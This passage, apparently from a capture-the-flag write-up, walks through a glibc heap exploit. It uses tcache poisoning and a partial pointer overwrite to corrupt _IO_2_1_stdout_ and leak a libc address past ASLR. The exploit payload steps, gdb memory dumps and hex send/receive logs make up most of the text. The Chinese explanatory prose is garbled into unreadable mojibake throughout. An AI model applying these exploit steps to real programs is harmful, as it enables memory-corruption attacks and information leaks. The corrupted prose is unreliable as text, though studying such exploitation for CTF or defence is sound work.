&lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_buf_base = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_buf_end = 0x7ffff7fc47e4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7fc3a00 &lt;_IO_2_1_stdin_&gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>, _shortbuf = <span class="string">&quot;\n&quot;</span>, _lock = 0x7ffff7fc6580 &lt;_IO_stdfile_1_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7fc38c0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;&#125;, vtable = 0x7ffff7fc5560 &lt;__GI__IO_file_jumps&gt;&#125;</span><br><span class="line"></span><br><span class="line">(gdb) p &amp;_IO_2_1_stdout_</span><br><span class="line"><span class="variable">$2</span> = (struct _IO_FILE_plus *) 0x7ffff7fc4760 &lt;_IO_2_1_stdout_&gt;</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œå¦‚æœå¯ä»¥å°†_IO_write_baseæ›´æ”¹ä¸º_IO_write_endä¹‹å‰çš„æŸä¸ªå€¼ï¼Œå°†è¯±ä½¿stdoutè®¤ä¸ºå†…å®¹å·²è¢«ç¼“å­˜å¹¶ç­‰å¾…å‘é€ã€‚å½“å‰æŒ‡é’ˆæ˜¯0x7ffff7fc47e3ã€‚å¦‚æœåªå†™ä¸€ä¸ªç©ºå­—èŠ‚ï¼Œé‚£ä¹ˆå®ƒå°†æ˜¯0x7ffff7fc4700:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/12xg 0x00007ffff7fc4700</span><br><span class="line">0x7ffff7fc4700 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000      0x00007ffff7fc6570</span><br><span class="line">0x7ffff7fc4710 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7fc4720 &lt;_IO_2_1_stderr_+160&gt;:   0x00007ffff7fc3780      0x0000000000000000</span><br><span class="line">0x7ffff7fc4730 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7fc4740 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7fc4750 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007ffff7fc5560</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ‰“å°è¿‡æ¥ï¼Œå°±ä¼šæ³„éœ²libcç»•è¿‡ASLRã€‚</p>
<ul>
<li>æ”¹å˜æŒ‡å‘_IO_2_1_stdoutçš„æŒ‡é’ˆ</li>
</ul>
<p>å½“æœ€åç»“æŸæ—¶ï¼Œå·²ç»å°†main_arenaä¸­çš„è¿™ä¸ªæŒ‡é’ˆå†™åˆ°å †ä¸­ï¼Œå¹¶è®¾æ³•é‡Šæ”¾äº†ä¸¤ä¸ªâ€œæ–‡ä»¶â€ã€‚ä¹Ÿå¯ä»¥è®¿é—®ä¸€ä¸ªé‡å å—ä¹‹å‰çš„main_arenaæŒ‡é’ˆ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081  &lt;-- chunk B, currently <span class="keyword">in</span> tcache</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  &lt;-- libc meta</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000031</span><br></pre></td></tr></table></figure>

<p>æƒ³å†™0x7ffff7fc4760ã€‚å°†è·å–Bï¼Œå¹¶ä½¿ç”¨å®ƒä¿®æ”¹libcåœ°å€çš„ä½ä¸¤ä¸ªå­—èŠ‚ï¼ŒæŒ‡å‘_IO_2_1_stdout_:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x70)</span><br><span class="line">edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + b<span class="string">&quot;\x60\x47&quot;</span>)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨åœ¨å †ä¸Šæœ‰äº†æƒ³è¦å†™å…¥çš„åœ°å€:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x55555555c3e0: 0x00007ffff7fc4760      0x00007ffff7fc3ca0  &lt;-- now points to stdout</span><br></pre></td></tr></table></figure>

<p>å½“å‘ç°å¯ç”¨äº†ASLRæ—¶ï¼Œè¿™å¯èƒ½ä¼šå¤±è´¥ã€‚è¿™æ˜¯å› ä¸ºåœ°å€çš„ä½ä¸‰ä¸ªå­—èŠ‚(0x760)æ˜¯ä¸€è‡´çš„ï¼Œé«˜ä¸€ç‚¹çš„å­—èŠ‚(åœ¨æœ¬ä¾‹ä¸­æ˜¯4)å°†æ”¹å˜ASLRã€‚ä¸€æ—¦å®ƒæ­£å¸¸å·¥ä½œï¼Œå°±ä¼šæ‰“å¼€ASLRï¼Œè¿™æ ·å®ƒç­”å¯¹çš„æ¦‚ç‡å°±ä¼šæ˜¯1&#x2F;16, 6.25% å°½ç®¡å¦‚æ­¤ï¼Œä»ç„¶å¯ä»¥åå¤è¿›è¡Œæ”»å‡»ï¼Œæ‰€ä»¥åœ¨10æ¬¡å°è¯•ä¸­ï¼Œæœ‰50%çš„å‡ ç‡æˆåŠŸï¼Œåœ¨20æ¬¡å°è¯•ä¸­ï¼Œæˆ‘æœ‰75%çš„å‡ ç‡æˆåŠŸã€‚å°†æ›´æ–°è„šæœ¬ä»¥å¾ªç¯å¤±è´¥ã€‚</p>
<ul>
<li>å®šä½å†™åˆ°_IO_2_1_stdout</li>
</ul>
<p>ç°åœ¨ï¼Œæƒ³åœ¨è¿™ä¸ªç»“æ„ä¸Šåˆ›å»ºä¸€ä¸ªå—ï¼Œå°†ä½¿ç”¨ä¸ä»¥å‰ç›¸åŒçš„tcacheæ¯’åŒ–æŠ€æœ¯ã€‚ç»è¿‡ä¸€å †é‡å†™ï¼Œè®¾æ³•è¾¾åˆ°è¿™ä¸€ç‚¹çš„tcacheçœ‹èµ·æ¥åƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0                                                                               </span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )                </span><br><span class="line">(0x40)   tcache_entry[2](2): 0x55555555c460 --&gt; 0x55555555c300</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x80)   tcache_entry[6](1): 0x55555555c3b0</span><br><span class="line">(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›®æ ‡åœ°å€åœ¨0x300sä¸­ï¼Œé‚£ä¹ˆ0x40 tcache binsçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç›®æ ‡ã€‚å°†ä½¿ç”¨ä¸ä¸Šé¢ç›¸åŒçš„æŠ€å·§ç¼–è¾‘æŒ‡é’ˆï¼Œåœ¨460å¤„è·å–binï¼Œå°†å…¶ç¼–è¾‘ä¸º0ï¼Œä½¿ç¬¬äºŒä¸ªæ–‡ä»¶æŒ‡å‘å®ƒï¼Œé‡Šæ”¾ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œä»¥ä¾¿åœ¨æœ‰ä¸€ä¸ªå¥æŸ„çš„æ—¶å€™å®ƒå›åˆ°tcacheä¸­ï¼Œç„¶åç¼–è¾‘åœ°å€ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;F&#x27;</span>, 0x30)           <span class="comment"># fetch 460 chunk from tcache, 300 still in 0x40 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;F&#x27;</span>, 0)             <span class="comment"># 460 -&gt; 300 in 0x40 tcache, f1 -&gt; 460 </span></span><br><span class="line">add(<span class="string">&#x27;F2&#x27;</span>, 0x30)          <span class="comment"># f1 and f2 -&gt; 460, 300 in 0x40 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;F&#x27;</span>)                  <span class="comment"># f2 -&gt; 460, 460 -&gt; 300 in 0x40 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;F2&#x27;</span>, 0x30, <span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># 460 -&gt; 3e0 -&gt; stdout in 0x40 tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get 460 from tcahce, shrink it, and release it</span></span><br><span class="line">add(<span class="string">&#x27;F3&#x27;</span>, 0x30)</span><br><span class="line">edit(<span class="string">&#x27;F3&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;F3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get 3e0 from tcache, shrink it, and release it</span></span><br><span class="line">add(<span class="string">&#x27;fake3&#x27;</span>, 0x30)</span><br><span class="line">edit(<span class="string">&#x27;fake3&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;fake3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clean up F2</span></span><br><span class="line">edit(<span class="string">&#x27;F2&#x27;</span>, 0x10, p64(0)*2) <span class="comment"># overwrtie pointer and key to allow double free</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;F2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œ0x40 tcacheåˆ—è¡¨æŒ‡å‘_IO_2_1_stdout_:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x40)   tcache_entry[2](0): 0x7ffff7fc4760 --&gt; 0xfbad2887 (invalid memory)</span><br></pre></td></tr></table></figure>

<ul>
<li>å†™_IO_2_1_stdout</li>
</ul>
<p>å¦‚ä¸Šæ‰€è¿°ï¼Œå°†æ”»å‡»stdoutçš„æ–‡ä»¶ç»“æ„ã€‚åœ¨gdbä¸­å±•ç¤ºäº†ä¸Šé¢çš„ç»“æ„ä½“ï¼Œä½†<span class="exturl" data-url="aHR0cDovL3NvdXJjZXdhcmUub3JnL2dpdC8/cD1nbGliYy5naXQ7YT1ibG9iO2Y9bGliaW8vbGliaW8uaDtoPTNjZjE3MTJlYTk4ZDNjMjUzZjQxOGZlYjFlZjg4MWM0YTQ0NjQ5ZDU7aGI9SEVBRCNsMjQ1">æºä»£ç <i class="fa fa-external-link-alt"></i></span>ä¹Ÿå¾ˆæœ‰ç”¨:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> 245 struct _IO_FILE &#123;</span><br><span class="line"> 246   int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line"> 247 <span class="comment">#define _IO_file_flags _flags</span></span><br><span class="line"> 248 </span><br><span class="line"> 249   /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line"> 250   /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line"> 251   char* _IO_read_ptr;   /* Current <span class="built_in">read</span> pointer */</span><br><span class="line"> 252   char* _IO_read_end;   /* End of get area. */</span><br><span class="line"> 253   char* _IO_read_base;  /* Start of putback+get area. */</span><br><span class="line"> 254   char* _IO_write_base; /* Start of put area. */</span><br><span class="line"> 255   char* _IO_write_ptr;  /* Current put pointer. */</span><br><span class="line"> 256   char* _IO_write_end;  /* End of put area. */</span><br><span class="line"> 257   char* _IO_buf_base;   /* Start of reserve area. */</span><br><span class="line"> 258   char* _IO_buf_end;    /* End of reserve area. */</span><br><span class="line"> 259   /* The following fields are used to support backing up and undo. */</span><br><span class="line"> 260   char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line"> 261   char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line"> 262   char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line">...[snip]...</span><br><span class="line"> 285 <span class="comment">#ifdef _IO_USE_OLD_IO_FILE</span></span><br><span class="line"> 286 &#125;;</span><br></pre></td></tr></table></figure>

<p>å°†è¦†ç›–_flagsã€ä¸‰ä¸ª_IO_read_*åœ°å€å’Œ_IO_write_ptrçš„ä½å­—èŠ‚ã€‚_flagsåœ¨<span class="exturl" data-url="aHR0cDovL3NvdXJjZXdhcmUub3JnL2dpdC8/cD1nbGliYy5naXQ7YT1ibG9iO2Y9bGliaW8vbGliaW8uaDtoPTNjZjE3MTJlYTk4ZDNjMjUzZjQxOGZlYjFlZjg4MWM0YTQ0NjQ5ZDU7aGI9SEVBRCNsODY=">è¿™é‡Œ<i class="fa fa-external-link-alt"></i></span>å®šä¹‰:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 92 <span class="comment">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span></span><br><span class="line"> 93 <span class="comment">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span></span><br><span class="line"> 94 <span class="comment">#define _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"> 95 <span class="comment">#define _IO_USER_BUF 1 /* User owns buffer; don&#x27;t delete it on close. */</span></span><br><span class="line"> 96 <span class="comment">#define _IO_UNBUFFERED 2</span></span><br><span class="line"> 97 <span class="comment">#define _IO_NO_READS 4 /* Reading not allowed */</span></span><br><span class="line"> 98 <span class="comment">#define _IO_NO_WRITES 8 /* Writing not allowed */</span></span><br><span class="line"> 99 <span class="comment">#define _IO_EOF_SEEN 0x10</span></span><br><span class="line">100 <span class="comment">#define _IO_ERR_SEEN 0x20</span></span><br><span class="line">101 <span class="comment">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&#x27;t call close(_fileno) on cleanup. */</span></span><br><span class="line">102 <span class="comment">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span></span><br><span class="line">103 <span class="comment">#define _IO_IN_BACKUP 0x100</span></span><br><span class="line">104 <span class="comment">#define _IO_LINE_BUF 0x200</span></span><br><span class="line">105 <span class="comment">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span></span><br><span class="line">106 <span class="comment">#define _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line">107 <span class="comment">#define _IO_IS_APPENDING 0x1000</span></span><br><span class="line">108 <span class="comment">#define _IO_IS_FILEBUF 0x2000</span></span><br><span class="line">109 <span class="comment">#define _IO_BAD_SEEN 0x4000</span></span><br><span class="line">110 <span class="comment">#define _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªé«˜å­—èŠ‚å°†æ˜¯0xfbadï¼Œè¿™æ˜¯è¯¥ç»“æ„çš„ç¥å¥‡æ•°å­—ã€‚å¯¹äºåº•éƒ¨çš„ä¸¤ä¸ªå­—èŠ‚ï¼Œå°†æ‰“å¼€_io_currently_putså’Œ_IO_IS_APPENDINGã€‚è¿™äº›æ ‡è®°æ˜¯åœ¨å…¶ä»–CTFæ–‡ç« ä¸­çœ‹åˆ°è¿‡çš„ï¼Œåœ¨è¿™é‡Œè¡¨æ˜è¿™äº›æ•°æ®å·²ç»å‡†å¤‡å¥½äº†ã€‚</p>
<p>ä¸è®¤ä¸ºåœ¨ä¸‰ä¸ª_IO_read_*å­—æ®µä¸­å†™ä»€ä¹ˆæ˜¯éå¸¸é‡è¦çš„ï¼Œå› ä¸ºæ²¡æœ‰ä¸œè¥¿ä»stdoutè¯»å–ã€‚ç„¶åï¼Œæƒ³è¦ä¸€ä¸ªåœ¨_IO_write_ptrç©ºå­—èŠ‚çš„ä½å­—èŠ‚ã€‚</p>
<p>å°†å¾—åˆ°ä¸€ä¸ªæœºä¼šå†™åˆ°_IO_2_1_stdout_ï¼Œå› ä¸ºè°ƒç”¨editå°†è°ƒç”¨reallocï¼Œè¿™å°†å¤±è´¥ï¼Œå› ä¸ºå®ƒå°†å‘ç°æ„å¤–çš„æ•°æ®ï¼Œå®ƒæœŸå¾…å †å…ƒã€‚ä»”ç»†è§‚å¯Ÿaddï¼Œå®ƒä½¿ç”¨fgetsï¼Œæ‰€ä»¥å®ƒå°†<span class="exturl" data-url="aHR0cDovL3d3dy5jcGx1c3BsdXMuY29tL3JlZmVyZW5jZS9jc3RkaW8vZmdldHMv">è¯»å–åˆ°å®Œæ•´çš„å¤§å°ï¼Œæˆ–è€…ç›´åˆ°æ¢è¡Œ<i class="fa fa-external-link-alt"></i></span>ã€‚å› ä¸ºä¸ä¼šå†™å®Œæ•´çš„å¤§å°ï¼Œæ‰€ä»¥sendlineçš„æ¢è¡Œç¬¦ä¼šåœ¨é‚£é‡Œã€‚å®ƒè¿˜åœ¨è¾“å…¥çš„æœ«å°¾è¿½åŠ ä¸€ä¸ªnullã€‚</p>
<p>æŠŠæ‰€æœ‰è¿™äº›æ”¾åœ¨ä¸€èµ·ï¼Œå°†åˆ›å»ºå¦‚ä¸‹çš„bin:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;stdout&#x27;</span>, 0x30, p64(0xfbad1800) + p64(0)*2 + b<span class="string">&quot;\x00&quot;</span>*7)</span><br></pre></td></tr></table></figure>

<ul>
<li>æ³„éœ²</li>
</ul>
<p>ä¸ºäº†çœ‹åˆ°å®é™…æ“ä½œï¼Œå°†è¿è¡Œå¯¹_IO_2_1_stdout_çš„å†™å…¥æ“ä½œï¼Œç„¶åé™„åŠ gdbå¹¶åœ¨0x0000555555555b92å¤„è®¾ç½®ä¸€ä¸ªé¢å¤–çš„æ–­ç‚¹ã€‚è¿™æ˜¯åœ¨æ·»åŠ å®Œæˆä¹‹åï¼Œä½†åœ¨æ‰“å°ä»»ä½•å†…å®¹ä¹‹å‰(ä¸€æ—¦æ‰“å°å®Œæˆï¼Œæ–‡ä»¶ä¸­çš„æ‰€æœ‰æŒ‡é’ˆéƒ½å°†è¢«æ›´æ–°)ã€‚ç°åœ¨ï¼Œå°†è·³è¿‡Pythonè„šæœ¬ä¸­çš„æ³„æ¼æŒ‡ä»¤ï¼Œgdbå°†è¾¾åˆ°è¿™ä¸ªæ–­ç‚¹ã€‚å°†æ£€æŸ¥_IO_2_1_stdout_:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x0000555555555b92 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/12xg &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7fc4760 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x0000000000000000  &lt;-- modified flags, null <span class="built_in">read</span> ptr</span><br><span class="line">0x7ffff7fc4770 &lt;_IO_2_1_stdout_+16&gt;:    0x0000000000000000      0x0a00000000000000  &lt;-- null <span class="built_in">read</span> end, null <span class="built_in">read</span> base</span><br><span class="line">0x7ffff7fc4780 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7fc4700      0x00007ffff7fc47e3  &lt;-- low byte 0 <span class="keyword">for</span> write ptr</span><br><span class="line">0x7ffff7fc4790 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7fc47e3      0x00007ffff7fc47e3</span><br><span class="line">0x7ffff7fc47a0 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7fc47e4      0x0000000000000000</span><br><span class="line">0x7ffff7fc47b0 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å½“å…è®¸ç»§ç»­è¿™æ ·åš(å¹¶ä¸”é€šè¿‡åœ¨è°ƒç”¨çš„æœ«å°¾æ·»åŠ æ—¥å¿—çº§åˆ«ä¸ºDEBUGçš„Pythonè„šæœ¬è¿è¡Œ)ï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®è¿”å›:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;add stdout\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    b<span class="string">&#x27;size: &#x27;</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;48\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    b<span class="string">&#x27;content: &#x27;</span></span><br><span class="line">[DEBUG] Sent 0x20 bytes:</span><br><span class="line">    00000000  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000020</span><br><span class="line">[DEBUG] Received 0xe5 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  70 65 <span class="built_in">fc</span> f7  ff 7f 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚peÂ·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000010  ff ff ff ff  ff ff ff ff  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000020  80 37 <span class="built_in">fc</span> f7  ff 7f 00 00  00 00 00 00  00 00 00 00  â”‚Â·7Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    *</span><br><span class="line">    00000050  00 00 00 00  00 00 00 00  60 55 <span class="built_in">fc</span> f7  ff 7f 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚`UÂ·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000060  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000080  00 47 <span class="built_in">fc</span> f7  ff 7f 00 00  e3 47 <span class="built_in">fc</span> f7  ff 7f 00 00  â”‚Â·GÂ·Â·â”‚Â·Â·Â·Â·â”‚Â·GÂ·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000090  e3 47 <span class="built_in">fc</span> f7  ff 7f 00 00  e3 47 <span class="built_in">fc</span> f7  ff 7f 00 00  â”‚Â·GÂ·Â·â”‚Â·Â·Â·Â·â”‚Â·GÂ·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    000000a0  e4 47 <span class="built_in">fc</span> f7  ff 7f 00 00  00 00 00 00  00 00 00 00  â”‚Â·GÂ·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    000000b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    000000c0  00 00 00 00  00 00 00 00  00 3a <span class="built_in">fc</span> f7  ff 7f 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·:Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    000000d0  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    000000e0  00 00 00 24  20                                     â”‚Â·Â·Â·$â”‚ â”‚</span><br><span class="line">    000000e5</span><br></pre></td></tr></table></figure>

<p>è·Ÿä¹‹å‰çœ‹åˆ°çš„å’Œé¢„æœŸçš„ç›¸ç¬¦ã€‚å¯ä»¥ä»8-15å­—èŠ‚ä¸­æå–libcåœ°å€ã€‚</p>
